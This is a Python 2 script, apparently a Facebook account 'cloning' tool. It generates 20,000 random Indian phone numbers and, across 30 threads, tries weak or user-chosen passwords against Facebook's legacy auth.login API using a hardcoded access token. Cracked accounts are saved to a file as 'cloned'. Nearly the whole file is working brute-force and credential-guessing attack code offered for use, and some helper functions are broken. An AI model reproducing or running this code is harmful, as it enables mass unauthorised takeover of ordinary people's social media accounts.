#!/usr/bin/python2
#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 bangla.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

print """


\033[1;97m _______   __            __                 
\033[1;97m/       \ /  |          /  |                
\033[1;97m$$$$$$$  |$$/   _______ $$ |____   __    __ 
\033[1;97m$$ |__$$ |/  | /       |$$      \ /  |  /  |
\033[1;97m$$    $$< $$ |/$$$$$$$/ $$$$$$$  |$$ |  $$ |
\033[1;97m$$$$$$$  |$$ |$$      \ $$ |  $$ |$$ |  $$ |
\033[1;97m$$ |  $$ |$$ | $$$$$$  |$$ |  $$ |$$ \__$$ |
\033[1;97m$$ |  $$ |$$ |/     $$/ $$ |  $$ |$$    $$/ 
\033[1;97m$$/   $$/ $$/ $$$$$$$/  $$/   $$/  $$$$$$/  
                                                               
\033[1;91m   â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
\033[1;93m   |                                           |
\033[1;92m   |Author:  Rishu Khan        ( ALEX )                        |
\033[1;93m   |                                           |
\033[1;93m   |FACEBOOK: https://www.facebook.com/rishu.007 |
\033[1;93m   |                                           |
\033[1;93m   |Youtube: Abhi nhi hai hoga kabhi                       |
\033[1;93m   |                                           |
\033[1;93m   â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    

"""

logo1 = """


\033[1;97m.########..####..######..##.....##.##.....##
\033[1;97m.##.....##..##..##....##.##.....##.##.....##
\033[1;97m.##.....##..##..##.......##.....##.##.....##
\033[1;97m.########...##...######..#########.##.....##
\033[1;97m.##...##....##........##.##.....##.##.....##
\033[1;97m.##....##...##..##....##.##.....##.##.....##
\033[1;97m.##.....##.####..######..##.....##..#######.

"""
logo= """


\033[1;97m _______   __            __                 
\033[1;97m/       \ /  |          /  |                
\033[1;97m$$$$$$$  |$$/   _______ $$ |____   __    __ 
\033[1;97m$$ |__$$ |/  | /       |$$      \ /  |  /  |
\033[1;97m$$    $$< $$ |/$$$$$$$/ $$$$$$$  |$$ |  $$ |
\033[1;97m$$$$$$$  |$$ |$$      \ $$ |  $$ |$$ |  $$ |
\033[1;97m$$ |  $$ |$$ | $$$$$$  |$$ |  $$ |$$ \__$$ |
\033[1;97m$$ |  $$ |$$ |/     $$/ $$ |  $$ |$$    $$/ 
\033[1;97m$$/   $$/ $$/ $$$$$$$/  $$/   $$/  $$$$$$/                                                                                                                                    
"""
CorrectCodeWord = 'Rishu'
print '   \x1b[1;93m[ðŸ”’ðŸ”’ðŸ”’] CodeWord Required To Enter [ðŸ”’ðŸ”’ðŸ”’]'
loop = 'true'
while loop == 'true':
    CodeWord = raw_input('\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;91m[ðŸ”] Enter CodeWord\x1b[1;97m: ')
    if (CodeWord == CorrectCodeWord):
        print('\n            \x1b[1;92mðŸ”“ðŸ”“ðŸ”“ Correct Entry ðŸ”“ðŸ”“ðŸ”“ \n                  ')
        jalan('    \x1b[1;97mâ€¢â—ˆâ€¢â—ˆâ€¢â—ˆâ€¢â—ˆâ€¢ Welcome To Indian Tool â€¢â—ˆâ€¢â—ˆâ€¢â—ˆâ€¢â—ˆâ€¢')
        loop = 'false'
    else:
        print '\x1b[1;91mWrong Entry!'
        os.system('xdg-open https://www.facebook.com/rishu.007')

def lisensi():
    os.system('clear')
    login()
def login():
    print logo
    os.system('clear')
    print logo
    print "\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \033[1;93m[1] First Follow me on Facebook"
    print "\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \033[1;93m[0] Exit"
    pilih_login()
def pilih_login():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m@Zahid@\033[1;91m] \x1b[1;95m[â—ˆ] \x1b[1;95mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login()
    elif peak == '1':
        os.system('xdg-open https://www.facebook.com/rishu.007')
        login1()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Invalid Option'
        keluar()

def login1():
    os.system('clear')
    print logo
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[1]\x1b[1;93m Fast Clone India FB Accounts.'
    print "\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \033[1;93m[2] Follow me on facebook"
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[0]\x1b[1;93m Exit The Program.'
    pilih_login1()


def pilih_login1():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m@Zahid@\033[1;91m] \x1b[1;95m[â—ˆ] \x1b[1;95mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login1()
    elif peak == '1':
        Zk()
    elif peak == '2':
        os.system('xdg-open https://www.facebook.com/rishu.007')
        login1()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Invalid Option'
        pilih_login1()


def Zk():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[1]\x1b[1;93m Start The Process'
    time.sleep(0.05)
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[0]\x1b[1;93m Go Back To The Previous Menu'
    time.sleep(0.05)
    pilih_Zk()


def pilih_Zk():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m@Zahid@\033[1;91m] \x1b[1;95m[â—ˆ] \x1b[1;95mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '[!] Fill In Correctly'
        pilih_login1()
    elif peak == '1':
        Trypass()
    elif peak == '0':
        login1()


def Trypass():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[1]\x1b[1;93m Try Automatic Passwords'
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[2]\x1b[1;93m Try Your Own Passwords'
    print '\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[0]\x1b[1;93m Go Back To The Previous Menu'
    pilih_Trypass()


def pilih_Trypass():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m@Zahid@] \x1b[1;95m[â—ˆ] \x1b[1;95mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '[!] Fill In Correctly'
        pilih_Trypass()
    elif peak == '1':
        automatic()
    elif peak == '2':
        own()
    elif peak == '0':
        Zk()
    else:
        print '[!] Fill In Correctly'
        passmenu()


def automatic():
    global cpb
    global oks
    os.system('clear')
    print logo1
    print '\x1b[1;93mAvailable Area Codes:'
    print 50 * '\033[1;94m_'
    print '             \x1b[1;97m99,98,95,94,92,91'
    print '             \x1b[1;97m79,78,74,73,72,71'
    print '             \x1b[1;97m68,66,64,63,62'
    print 50 * '\033[1;94m_'
    try:
        c = raw_input('\n\x1b[1;93m[\x1b[1;91m@Zahid@\033[1;93m] \x1b[1;93m[â—ˆ] \x1b[1;93mChoose Area Code:\x1b[1;98m')
        k = '+91'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        Trypass()

    print 50 * '\033[1;95mâ—ˆ'
    print '\x1b[1;37;40mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ Cloning Process Has Been Started â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ'
    print '\x1b[1;37;40mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ To Stop The Process Press CTRl+Z â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ'
    xxx = str(len(id))
    jalan('[âœ…] \x1b[1;97mTotal Numbers: ' + xxx)
    jalan('\x1b[1;97m[âœ…] \x1b[1;97mTrying Passwords Wait...')
    print 50 * '\x1b[1;95mâ—ˆ'
    print '\x1b[1;95mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ Developed By Rishu Khan â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ '

    def main(arg):
        user = arg
        try:
            os.mkdir('cloned')
        except OSError:
            pass

        try:
            pass1 = 'Imdia'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Active]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                okb = open('cloned/idz.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;95m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                cps = open('cloned/idz.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Active]    ' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    okb = open('cloned/idz.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('cloned/idz.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;95m'
    print '\x1b[1;95mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ RISHU KHAN ( ALEX ) â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ '
    print '[âœ…] Process Has Been Completed ...'
    print '[âœ…] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[âœ…] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mIn-Active Accounts Will Open Between 7-15 Days')
    jalan('\x1b[1;96mKhuda Hafiz')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\x1b[1;95m]')
    login()


def own():
    os.system('clear')
    print logo1
    print '\x1b[1;93mAvailable Area Codes:'
    print 50 * '\033[1;94m_'
    print '             \x1b[1;97m99,98,95,94,92,91'
    print '             \x1b[1;97m79,78,74,73,72,71'
    print '             \x1b[1;97m68,66,64,63,62'
    print 50 * '\033[1;94m_'
    print 50 * '\033[1;94m_'
    try:
        c = raw_input('\n\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[â—ˆ] \x1b[1;93mChoose Area Code:\x1b[1;98m')
        pass1 = raw_input('\x1b[1;93m[\x1b[1;92m@Zahid@\033[1;93m] \x1b[1;93m[â—ˆ] \x1b[1;97mEnter Your Password: \x1b[1;97m')
        k = '+91'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        passmenu()

    print 50 * '\033[1;95mâ—ˆ'
    print '\x1b[1;37;40mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ Cloning Process Has Been Started â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ'
    print '\x1b[1;37;40mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ To Stop The Process Press CTRl+Z â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ'
    xxx = str(len(id))
    jalan('\033[1;97m[âœ…] \x1b[1;97mTotal Numbers: ' + xxx)
    jalan('\x1b[1;97m[âœ…] \x1b[1;97mTrying Your Password Wait...')
    print 50 * '\x1b[1;95mâ—ˆ'
    print '\x1b[1;95mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ Developed By Rishu Khan â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ '

    def main(arg):
        user = arg
        try:
            os.mkdir('cloned')
        except OSError:
            pass

        try:
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Active]    ' + k + c + user + ' \x1b[1;97m|  ' + pass1
                okb = open('cloned/idz.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;95m[In-Active] \x1b[1;97m' + k + c + user + ' \x1b[1;97m|  ' + pass1
                cps = open('cloned/idz.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;95m'
    print '\x1b[1;95mâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ Developed By Rishu Khan â—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆâ—ˆ '
    print '[âœ…] Process Has Been Completed ...'
    print '[âœ…] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[âœ…] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mIn-Active Accounts Will Open Between 7-15 Days')
    jalan('\x1b[1;96mKhuda Hafiz')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\x1b[1;95m]')
    own()
if __name__ == '__main__':
    login()
      
